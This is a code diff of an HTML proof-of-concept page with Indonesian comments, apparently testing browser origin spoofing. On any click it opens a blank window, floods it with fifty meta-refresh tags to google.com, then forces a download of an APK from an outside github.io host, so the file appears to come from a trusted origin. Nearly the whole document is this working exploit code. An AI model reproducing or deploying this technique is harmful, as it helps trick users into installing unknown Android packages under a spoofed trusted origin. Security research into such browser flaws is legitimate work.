@@ -1,12 +1,47 @@
 <html>
 <head>
-    <title>PoC Origin Nullification</title>
-    <!-- Setelah 3 detik, pindah ke konteks data: yang memicu download -->
-    <meta http-equiv="refresh" content="3; url=data:text/html,<html><body><h1>Redirecting...</h1><script>window.location='https://bangbedul19-del.github.io/bedulsantuy/pocbedul.apk';</script></body></html>">
+    <title>Origin Spoofing Research</title>
+    <style>
+        body { height: 100vh; cursor: pointer; display: flex; align-items: center; justify-content: center; font-family: sans-serif; }
+    </style>
 </head>
 <body>
-    <h1>Testing Origin Nullification via Data URI</h1>
-    <p>Tunggu 3 detik. Browser akan masuk ke konteks 'data:' lalu mencoba mengunduh file.</p>
-    <p>Perhatikan apakah dialog download muncul di atas origin 'null' atau origin halaman ini.</p>
+    <h1>Klik di mana saja untuk memicu Test</h1>
+
+    <script>
+        window.onclick = function() {
+            // 1. Buka jendela kosong
+            var win = window.open('about:blank', 'test_window', 'width=600,height=400');
+
+            // 2. Siapkan konten "Meta Spam"
+            // Kita arahkan ke google.com sebagai target spoof, lalu selipkan payload download
+            var targetOrigin = "https://google.com";
+            var payloadURL = "https://bangbedul19-del.github.io/bedulsantuy/pocbedul.apk";
+            
+            var metaSpam = "";
+            for (var i = 0; i < 50; i++) {
+                metaSpam += `<meta http-equiv="refresh" content="0; url=${targetOrigin}">\n`;
+            }
+
+            // 3. Suntikkan ke about:blank
+            win.document.write(`
+                <html>
+                <head>
+                    ${metaSpam}
+                    <script>
+                        // Picu download tepat saat browser sedang pusing memproses 50 meta tags
+                        setTimeout(function() {
+                            window.location.href = "${payloadURL}";
+                        }, 500);
+                    <\/script>
+                </head>
+                <body>
+                    <h2>Processing Navigations...</h2>
+                </body>
+                </html>
+            `);
+            win.document.close();
+        };
+    </script>
 </body>
 </html>
